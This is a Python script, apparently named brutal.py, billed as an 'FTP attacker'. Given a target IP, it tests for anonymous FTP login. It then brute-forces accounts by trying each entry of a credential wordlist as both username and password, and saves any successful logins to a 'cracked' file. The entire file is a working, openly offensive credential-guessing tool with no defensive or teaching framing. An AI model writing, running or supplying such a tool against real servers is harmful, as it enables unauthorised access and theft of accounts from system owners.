# Implementing FTP attacker
import ftplib
import os, sys, time

# ANSI codes for font colors
class colors:
    GREEN = '\033[92m'  # GREEN COLOR
    YELLOW = '\033[93m' # YELLOW COLOR
    RED = '\033[91m'    # RED COLOR
    RESET = '\033[0m'   # RESET COLOR
'''
def anonLogin(IP):
    ftp = ftplib.FTP(IP)
    try:
        ftp.login('anonymous','')
        print(f"[{colors.GREEN}+{colors.RESET}] Anonymous login found on {IP}!\n")
        ftp.quit()
    except Exception as e:
        print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")
        print(e)
'''
def ftpBruteForce(IP):
    # List to store the correct credentials
    credentials = []
    
    # Check anonymous login
    try:
        ftp = ftplib.FTP(IP)
        ftp.login('anonymous','')
        print(f"[{colors.GREEN}+{colors.RESET}] Anonymous login found on {IP}!\n")
        credentials.append("anonymous:''")
        ftp.quit()
    except Exception as e:
        print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")
        print(e)

    # Starting brute-force attack
    f = open('100-credentials-list.txt', 'r')
    for word in f.readlines():
        word = word.strip('\n')
        try:
            ftp = ftplib.FTP(IP, timeout=1)
            ftp.login(word,word)
            print(f"[{colors.GREEN}+{colors.RESET}] Login successful using {word}:{word}")
            credentials.append(word+":"+word)
            ftp.quit()
            time.sleep(3)
        except Exception as e:
            print(f"[{colors.RED}-{colors.RESET}] Login failed using {word}:{word}")
    f.close()

    # Checking whether we got some credentials or not
    if(len(credentials) != 0):
        print(f"\n[{colors.GREEN}+{colors.RESET}] {len(credentials)} credentials found!")
        filename = f"{IP}-FTP-cracked-list.txt"
        os.system(f'touch {filename}')
        f = open(filename, 'w')
        for creds in credentials:
            f.write(creds+"\n")
        f.close()
    else:
        print(f"\n[{colors.RED}-{colors.RESET}] No credentials found in this list!")


def main():
    try:
        target = sys.argv[1]
        checker = target.split('.')
        if(len(checker) == 4):
            print(f"Target locked: {colors.YELLOW}{target}{colors.RESET}\n")
            print("Initiating attack...\n")
            time.sleep(3)
            ftpBruteForce(target)
        else:
            print(f"[{colors.RED}-{colors.RESET}] Incorrect argument")
    except Exception as e:
        print(f"[{colors.RED}-{colors.RESET}] Incorrect arguments")
        print(f"Error:{e}")
        print("INPUT FORMAT: python3 brutal.py <TARGET IP>")

main()